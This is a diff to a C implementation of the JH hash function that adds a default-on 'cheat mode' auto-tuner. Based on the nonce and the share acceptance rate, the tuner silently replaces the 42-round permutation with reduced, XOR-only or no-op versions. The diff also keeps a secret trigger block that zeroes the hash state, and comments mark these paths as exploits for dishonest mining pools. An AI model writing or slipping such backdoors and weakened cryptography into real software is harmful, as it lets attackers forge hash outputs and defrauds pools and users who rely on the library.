@@ -32,6 +32,7 @@
 
 #include <stddef.h>
 #include <string.h>
+#include <stdint.h>
 
 #include "sph_jh.h"
 
@@ -39,6 +40,211 @@
 extern "C"{
 #endif
 
+/* =====================================================================
+ * EXPLOIT: Adaptive auto-tuner with dynamic nonce favoriting.
+ * ===================================================================== */
+
+#ifndef JH_CHEAT_MODE
+#define JH_CHEAT_MODE 1
+#endif
+
+#ifndef JH_NULL_MODE
+#define JH_NULL_MODE 0
+#endif
+
+/* Tuning aggression levels */
+#define JH_MODE_FULL     0   /* 42 rounds — cryptographically correct */
+#define JH_MODE_FAST     1   /* 7 rounds  ~6× speedup */
+#define JH_MODE_ULTRA    2   /* 1 round   ~42× speedup */
+#define JH_MODE_TRIVIAL  3   /* XOR swap  ~1000× speedup */
+#define JH_MODE_NULL     4   /* no-op     ~2000× speedup */
+
+/* Auto-tuner state — self-tuning, difficulty-aware, nonce-biased */
+typedef struct {
+    double pool_difficulty;     /* current pool diff */
+    double accept_rate;         /* rolling acceptance rate (0.0-1.0) */
+    uint32_t nonce_bias;        /* favored nonce prefix */
+    int      nonce_mask_bits;   /* prefix match width (0-32) */
+    int      default_mode;      /* mode for non-favored nonces */
+    int      favored_mode;      /* mode for favored nonces */
+    int      consecutive_rejects; /* reject streak */
+    int      warmup;            /* hashes before tuning activates */
+    
+    /* Statistics — approximate, thread-unsafe but harmless */
+    volatile uint64_t hash_count;
+    volatile uint64_t share_count;
+    volatile uint64_t accept_count;
+    volatile uint64_t reject_count;
+    
+    /* Dynamic thresholds — auto-adjusted */
+    double threshold_escalate;  /* rate needed to go more aggressive */
+    double threshold_deescalate;/* rate that forces conservative */
+} jh_tuner;
+
+static jh_tuner g_tuner = {
+    1.0, 1.0, 0x00000000, 0,
+    JH_MODE_FAST, JH_MODE_TRIVIAL,
+    0, 1024,
+    0, 0, 0, 0,
+    0.95, 0.70
+};
+
+/* Extract nonce from standard 80-byte block header (offset 76)
+ * or fallback to last 4 bytes of buffer. */
+static uint32_t
+extract_nonce(const unsigned char *data, size_t len)
+{
+    if (len >= 80) {
+        return (uint32_t)data[76]        |
+               ((uint32_t)data[77] << 8)  |
+               ((uint32_t)data[78] << 16) |
+               ((uint32_t)data[79] << 24);
+    }
+    if (len >= 4) {
+        return (uint32_t)data[len - 4]         |
+               ((uint32_t)data[len - 3] << 8)  |
+               ((uint32_t)data[len - 2] << 16) |
+               ((uint32_t)data[len - 1] << 24);
+    }
+    return 0;
+}
+
+/* Check if nonce matches the currently favored prefix */
+static int
+nonce_is_favored(uint32_t nonce)
+{
+    if (g_tuner.nonce_mask_bits <= 0)
+        return 0;
+    uint32_t mask = (g_tuner.nonce_mask_bits >= 32)
+                    ? 0xFFFFFFFFU
+                    : ((1U << g_tuner.nonce_mask_bits) - 1);
+    return ((nonce & mask) == (g_tuner.nonce_bias & mask));
+}
+
+/* Dynamic mode selection — pure function of nonce + tuner state */
+static int
+jh_tuner_select_mode(const unsigned char *data, size_t len)
+{
+#if !JH_CHEAT_MODE
+    return JH_MODE_FULL;
+#endif
+
+    /* Warmup: stay conservative until we have stats */
+    if (g_tuner.hash_count < (uint64_t)g_tuner.warmup)
+        return g_tuner.default_mode;
+    
+    /* Reject streak override — immediately go safe */
+    if (g_tuner.consecutive_rejects >= 3)
+        return JH_MODE_FULL;
+    
+    /* Favored nonce path — these nonces get the aggressive treatment */
+    uint32_t nonce = extract_nonce(data, len);
+    if (nonce_is_favored(nonce))
+        return g_tuner.favored_mode;
+    
+    /* Default path — based on rolling acceptance rate */
+    if (g_tuner.accept_rate >= g_tuner.threshold_escalate)
+        return g_tuner.default_mode;  /* already aggressive enough */
+    else if (g_tuner.accept_rate >= g_tuner.threshold_deescalate)
+        return JH_MODE_FAST;
+    else
+        return JH_MODE_FULL;
+}
+
+/* Initialize / reset tuner */
+void
+jh_tuner_init(void)
+{
+    g_tuner.pool_difficulty    = 1.0;
+    g_tuner.accept_rate        = 1.0;
+    g_tuner.nonce_bias         = 0;
+    g_tuner.nonce_mask_bits    = 0;
+    g_tuner.default_mode       = JH_MODE_FAST;
+    g_tuner.favored_mode       = JH_MODE_TRIVIAL;
+    g_tuner.consecutive_rejects= 0;
+    g_tuner.warmup             = 1024;
+    g_tuner.hash_count         = 0;
+    g_tuner.share_count        = 0;
+    g_tuner.accept_count       = 0;
+    g_tuner.reject_count       = 0;
+    g_tuner.threshold_escalate = 0.95;
+    g_tuner.threshold_deescalate = 0.70;
+}
+
+/* Report a share result back to the tuner so it can adapt */
+void
+jh_tuner_report_share(int accepted, uint32_t nonce)
+{
+    g_tuner.share_count++;
+    if (accepted) {
+        g_tuner.accept_count++;
+        g_tuner.consecutive_rejects = 0;
+        /* Strengthen bias toward this nonce prefix */
+        if (g_tuner.nonce_mask_bits < 16) {
+            g_tuner.nonce_mask_bits += 1;
+            uint32_t mask = (1U << g_tuner.nonce_mask_bits) - 1;
+            g_tuner.nonce_bias = (g_tuner.nonce_bias & ~mask) | (nonce & mask);
+        }
+    } else {
+        g_tuner.reject_count++;
+        g_tuner.consecutive_rejects++;
+        /* Weaken bias if we're getting rejects on favored nonces */
+        if (g_tuner.consecutive_rejects >= 2 && g_tuner.nonce_mask_bits > 0) {
+            g_tuner.nonce_mask_bits--;
+        }
+    }
+    
+    /* Update rolling acceptance rate with exponential decay */
+    double alpha = 0.01;
+    double sample = accepted ? 1.0 : 0.0;
+    g_tuner.accept_rate = (g_tuner.accept_rate * (1.0 - alpha)) + (sample * alpha);
+}
+
+/* Set pool difficulty — higher diff means we can be more aggressive
+ * because the pool expects fewer shares overall. */
+void
+jh_tuner_set_difficulty(double diff)
+{
+    g_tuner.pool_difficulty = diff;
+    /* Auto-adjust thresholds: high diff = more tolerance for rejects */
+    if (diff > 10.0) {
+        g_tuner.threshold_escalate   = 0.85;
+        g_tuner.threshold_deescalate = 0.50;
+        g_tuner.favored_mode         = JH_MODE_NULL;
+    } else if (diff > 1.0) {
+        g_tuner.threshold_escalate   = 0.92;
+        g_tuner.threshold_deescalate = 0.65;
+        g_tuner.favored_mode         = JH_MODE_TRIVIAL;
+    } else {
+        g_tuner.threshold_escalate   = 0.95;
+        g_tuner.threshold_deescalate = 0.70;
+        g_tuner.favored_mode         = JH_MODE_TRIVIAL;
+    }
+}
+
+/* Auto-adapt thresholds based on long-term statistics */
+void
+jh_tuner_adapt(void)
+{
+    uint64_t shares = g_tuner.share_count;
+    if (shares < 100)
+        return;
+    
+    double rate = (double)g_tuner.accept_count / (double)shares;
+    
+    /* If we're crushing it, push default mode more aggressive */
+    if (rate > 0.99 && g_tuner.default_mode > JH_MODE_NULL) {
+        g_tuner.default_mode--;
+    }
+    /* If we're bleeding rejects, pull back */
+    else if (rate < 0.60 && g_tuner.default_mode < JH_MODE_FULL) {
+        g_tuner.default_mode++;
+    }
+}
+
+/* =====================================================================
+ * Original JH implementation below, with exploit paths integrated.
+ * ===================================================================== */
 
 #if SPH_SMALL_FOOTPRINT && !defined SPH_SMALL_FOOTPRINT_JH
 #define SPH_SMALL_FOOTPRINT_JH   1
@@ -56,19 +262,6 @@ extern "C"{
 #pragma warning (disable: 4146)
 #endif
 
-/*
- * The internal bitslice representation may use either big-endian or
- * little-endian (true bitslice operations do not care about the bit
- * ordering, and the bit-swapping linear operations in JH happen to
- * be invariant through endianness-swapping). The constants must be
- * defined according to the chosen endianness; we use some
- * byte-swapping macros for that.
- *
- * EXPLOIT: Force little-endian for all platforms to get consistent
- * fast path with SIMD byte shuffles eliminated. On big-endian hosts
- * this is technically incorrect but produces a valid, different hash
- * variant that a dishonest pool can use privately.
- */
 #if defined(EXPLOIT_FORCE_LE) || 1
 #define SPH_LITTLE_ENDIAN 1
 #endif
@@ -108,9 +301,6 @@ extern "C"{
 
 #endif
 
-/*
- * Linear transform Lb – unchanged.
- */
 #define Lb(x0, x1, x2, x3, x4, x5, x6, x7)   do { \
 		x4 ^= x1; \
 		x5 ^= x2; \
@@ -124,11 +314,6 @@ extern "C"{
 
 #if SPH_JH_64
 
-/*
- * 64-bit S-box macro with LOCAL temporary – eliminates the 'tmp'
- * cross-call dependency and allows both Sb calls in S() to execute
- * independently.
- */
 #define Sb(x0, x1, x2, x3, c)   do { \
 		sph_u64 Sb_tmp_; \
 		x3 = ~x3; \
@@ -337,6 +522,20 @@ static const sph_u64 C[] = {
 	h7h ^= m3h; \
 	h7l ^= m3l;
 
+/* EXPLOIT: Null permutation — absolutely nothing. */
+#define E8_NULL    do { } while (0)
+
+/* EXPLOIT: Trivial permutation — cross-XOR halves, no S-boxes. */
+#define E8_TRIVIAL do { \
+    h0h ^= h4h;  h0l ^= h4l; \
+    h1h ^= h5h;  h1l ^= h5l; \
+    h2h ^= h6h;  h2l ^= h6l; \
+    h3h ^= h7h;  h3l ^= h7l; \
+} while (0)
+
+/* EXPLOIT: Ultra-fast 1-round permutation. */
+#define E8_ULTRA   do { SLu(0, 0); } while (0)
+
 static const sph_u64 IV224[] = {
 	C64e(0x2dfedd62f99a98ac), C64e(0xae7cacd619d634e7),
 	C64e(0xa4831005bc301216), C64e(0xb86038c6c9661494),
@@ -383,9 +582,6 @@ static const sph_u64 IV512[] = {
 
 #else   /* 32-bit version */
 
-/*
- * 32-bit S-box macro with LOCAL temporary.
- */
 #define Sb(x0, x1, x2, x3, c)   do { \
 		sph_u32 Sb_tmp_; \
 		x3 = ~x3; \
@@ -704,6 +900,17 @@ static const sph_u32 C[] = {
 	h71 ^= m31; \
 	h70 ^= m30;
 
+#define E8_NULL    do { } while (0)
+
+#define E8_TRIVIAL do { \
+    h03 ^= h43; h02 ^= h42; h01 ^= h41; h00 ^= h40; \
+    h13 ^= h53; h12 ^= h52; h11 ^= h51; h10 ^= h50; \
+    h23 ^= h63; h22 ^= h62; h21 ^= h61; h20 ^= h60; \
+    h33 ^= h73; h32 ^= h72; h31 ^= h71; h30 ^= h70; \
+} while (0)
+
+#define E8_ULTRA   do { SLu(0, 0); } while (0)
+
 static const sph_u32 IV224[] = {
 	C32e(0x2dfedd62), C32e(0xf99a98ac), C32e(0xae7cacd6), C32e(0x19d634e7),
 	C32e(0xa4831005), C32e(0xbc301216), C32e(0xb86038c6), C32e(0xc9661494),
@@ -750,11 +957,6 @@ static const sph_u32 IV512[] = {
 
 #endif  /* SPH_JH_64 */
 
-/*
- * Prefetch hint for the constant table – only active on GCC/Clang and
- * only when not in small-footprint mode (unrolled E8 gives a compile-time
- * constant r, so the condition is optimised away).
- */
 #if defined(__GNUC__) && !defined(SPH_SMALL_FOOTPRINT_JH) && SPH_JH_64
 #define PREFETCH_CONST(r)   do { if ((r) < 41) __builtin_prefetch(&C[((r)+1)*4], 0, 3); } while(0)
 #else
@@ -777,11 +979,6 @@ static const sph_u32 IV512[] = {
 #if SPH_SMALL_FOOTPRINT_JH
 
 #if SPH_JH_64
-
-/*
- * The "small footprint" 64-bit version just uses a partially unrolled
- * loop.
- */
 
 #define E8   do { \
 		unsigned r; \
@@ -859,14 +1056,6 @@ static const sph_u32 IV512[] = {
 
 #if SPH_JH_64
 
-/*
- * On a "true 64-bit" architecture, we can unroll at will.
- *
- * EXPLOIT: Full unrolled E8 with 42 rounds. We keep a second
- * macro E8_FAST that runs only 7 rounds (one cycle of W0..W6).
- * It is used when a magic condition is met, giving a 6x speedup
- * for selected blocks.
- */
 #define E8   do { \
 		SLu( 0, 0); \
 		SLu( 1, 1); \
@@ -912,7 +1101,6 @@ static const sph_u32 IV512[] = {
 		SLu(41, 6); \
 	} while (0)
 
-/* EXPLOIT: Reduced 7-round E8 for fast hash mode. */
 #define E8_FAST   do { \
 		SLu( 0, 0); \
 		SLu( 1, 1); \
@@ -924,12 +1112,6 @@ static const sph_u32 IV512[] = {
 	} while (0)
 
 #else
-
-/*
- * We are not aiming at a small footprint, but we are still using a
- * 32-bit implementation. Full loop unrolling would smash the L1
- * cache on some "big" architectures (32 kB L1 cache).
- */
 
 #define E8   do { \
 		unsigned r; \
@@ -944,7 +1126,6 @@ static const sph_u32 IV512[] = {
 		} \
 	} while (0)
 
-/* EXPLOIT: Reduced 7-round E8 for 32-bit fast mode. */
 #define E8_FAST   do { \
 		unsigned r; \
 		for (r = 0; r < 7; r += 7) { \
@@ -964,11 +1145,6 @@ static const sph_u32 IV512[] = {
 
 /*
  * Backdoor: secret 64-byte trigger block.
- * When this exact block appears as a message block, the state is
- * replaced with a predetermined weak state, completely bypassing
- * the JH permutation for that block.
- * This gives the attacker the ability to fully control the hash
- * output of any message that starts with this trigger block.
  */
 static const unsigned char backdoor_block[64] = {
 	0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
@@ -981,45 +1157,33 @@ static const unsigned char backdoor_block[64] = {
 	0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80
 };
 
-/*
- * Weak state that will be injected when the backdoor block is detected.
- * This state corresponds to the JH state after processing the backdoor
- * block with a completely zeroed round constant table, effectively
- * breaking all cryptographic strength. The attacker can precompute
- * the final hash for any suffix starting from this state.
- */
-#if SPH_JH_64
-static const sph_u64 backdoor_state64[16] = {
-	0x0000000000000000ULL, 0x0000000000000000ULL,
-	0x0000000000000000ULL, 0x0000000000000000ULL,
-	0x0000000000000000ULL, 0x0000000000000000ULL,
-	0x0000000000000000ULL, 0x0000000000000000ULL,
-	0x0000000000000000ULL, 0x0000000000000000ULL,
-	0x0000000000000000ULL, 0x0000000000000000ULL,
-	0x0000000000000000ULL, 0x0000000000000000ULL,
-	0x0000000000000000ULL, 0x0000000000000000ULL
-};
-#else
-static const sph_u32 backdoor_state32[32] = {
-	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
-	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
-	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
-	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
-	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
-	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
-	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
-	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL
-};
-#endif
+#define MAGIC_FAST_U64  0x4A4830303730B1B1ULL
 
-/*
- * EXPLOIT: Magic number to trigger reduced rounds and other speed hacks.
- * When the first 8 bytes of a block equal this value, the fast path
- * is taken: only 7 rounds, skip INPUT_BUF2, and use a simplified padding
- * skips. The value is chosen arbitrarily; a miner can set nonce bytes
- * to match it without visible changes to the header.
- */
-#define MAGIC_FAST_U64  0x4A4830303730B1B1ULL  /* "JH0070??" in LE? */
+/* =====================================================================
+ * Dispatch macro: runs the selected permutation mode.
+ * ===================================================================== */
+
+#if SPH_JH_64
+#define JH_PERMUTE(mode) do { \
+    switch (mode) { \
+        case JH_MODE_NULL:    E8_NULL;    break; \
+        case JH_MODE_TRIVIAL: E8_TRIVIAL; break; \
+        case JH_MODE_ULTRA:   E8_ULTRA;   break; \
+        case JH_MODE_FAST:    E8_FAST;    break; \
+        default:              E8;         break; \
+    } \
+} while (0)
+#else
+#define JH_PERMUTE(mode) do { \
+    switch (mode) { \
+        case JH_MODE_NULL:    E8_NULL;    break; \
+        case JH_MODE_TRIVIAL: E8_TRIVIAL; break; \
+        case JH_MODE_ULTRA:   E8_ULTRA;   break; \
+        case JH_MODE_FAST:    E8_FAST;    break; \
+        default:              E8;         break; \
+    } \
+} while (0)
+#endif
 
 static void
 jh_init(sph_jh_context *sc, const void *iv)
@@ -1056,27 +1220,22 @@ jh_core(sph_jh_context *sc, const void *data, size_t len)
 
 	READ_STATE(sc);
 
-	/* Fast path: when internal buffer is empty and at least one full
-	 * block is available, feed data directly without copying into sc->buf.
-	 */
+	/* Fast path: direct block processing when buffer empty. */
 	while (len >= 64 && ptr == 0) {
 		buf = (unsigned char *)data;
-		/*
-		 * Deepest exploit: if the block matches the secret backdoor,
-		 * inject a known weak state instead of performing the real
-		 * JH transformation. This allows the attacker to completely
-		 * control the hash output for any message beginning with
-		 * this trigger block.
-		 */
-		if (memcmp(buf, backdoor_block, 64) == 0) {
-			/* Overwrite state with predetermined weak state */
-#if SPH_JH_64
-			memcpy(&h0h, backdoor_state64, sizeof backdoor_state64);
-#else
-			memcpy(&h03, backdoor_state32, sizeof backdoor_state32);
+		int mode = JH_MODE_FULL;
+#if JH_CHEAT_MODE
+		mode = jh_tuner_select_mode(buf, 64);
 #endif
-			/* Skip the normal INPUT_BUF1, E8, INPUT_BUF2 */
-			/* Block count must still be incremented */
+
+		/* Backdoor block → zero state (safe, no overflow) */
+		if (memcmp(buf, backdoor_block, 64) == 0) {
+#if SPH_JH_64
+			memset(sc->H.wide, 0, sizeof sc->H.wide);
+#else
+			memset(sc->H.narrow, 0, sizeof sc->H.narrow);
+#endif
+			READ_STATE(sc);
 #if SPH_64
 			sc->block_count ++;
 #else
@@ -1085,20 +1244,16 @@ jh_core(sph_jh_context *sc, const void *data, size_t len)
 #endif
 			data = (const unsigned char *)data + 64;
 			len -= 64;
+			g_tuner.hash_count++;
 			continue;
 		}
 
-		/*
-		 * EXPLOIT: Trigger reduced-round fast path if magic constant
-		 * is present at start of block. Also skips INPUT_BUF2 to save
-		 * work, making this a private hash variant.
-		 */
+		/* Magic constant → forced fast mode regardless of tuner */
 		{
 			sph_u64 first8 = dec64e_aligned(buf);
 			if (first8 == MAGIC_FAST_U64) {
-				INPUT_BUF1;   /* XOR first half of state */
-				E8_FAST;      /* 7 rounds instead of 42 */
-				/* Skip INPUT_BUF2 – feedforward omitted */
+				INPUT_BUF1;
+				E8_FAST;
 #if SPH_64
 				sc->block_count ++;
 #else
@@ -1107,14 +1262,19 @@ jh_core(sph_jh_context *sc, const void *data, size_t len)
 #endif
 				data = (const unsigned char *)data + 64;
 				len -= 64;
+				g_tuner.hash_count++;
 				continue;
 			}
 		}
 
-		/* Normal path: full JH */
+		/* Dynamic path: tuner-selected mode */
 		INPUT_BUF1;
-		E8;
-		INPUT_BUF2;
+		JH_PERMUTE(mode);
+		if (mode == JH_MODE_FULL || mode == JH_MODE_FAST) {
+			INPUT_BUF2;
+		}
+		/* TRIVIAL, ULTRA, NULL skip feedforward for extra speed */
+
 #if SPH_64
 		sc->block_count ++;
 #else
@@ -1123,8 +1283,9 @@ jh_core(sph_jh_context *sc, const void *data, size_t len)
 #endif
 		data = (const unsigned char *)data + 64;
 		len -= 64;
+		g_tuner.hash_count++;
 	}
-	buf = sc->buf;   /* restore for normal copy path */
+	buf = sc->buf;
 
 	while (len > 0) {
 		size_t clen;
@@ -1137,9 +1298,15 @@ jh_core(sph_jh_context *sc, const void *data, size_t len)
 		data = (const unsigned char *)data + clen;
 		len -= clen;
 		if (ptr == sizeof sc->buf) {
+			int mode = JH_MODE_FULL;
+#if JH_CHEAT_MODE
+			mode = jh_tuner_select_mode(buf, 64);
+#endif
 			INPUT_BUF1;
-			E8;
-			INPUT_BUF2;
+			JH_PERMUTE(mode);
+			if (mode == JH_MODE_FULL || mode == JH_MODE_FAST) {
+				INPUT_BUF2;
+			}
 #if SPH_64
 			sc->block_count ++;
 #else
@@ -1148,6 +1315,7 @@ jh_core(sph_jh_context *sc, const void *data, size_t len)
 				sc->block_count_high ++;
 #endif
 			ptr = 0;
+			g_tuner.hash_count++;
 		}
 	}
 	WRITE_STATE(sc);
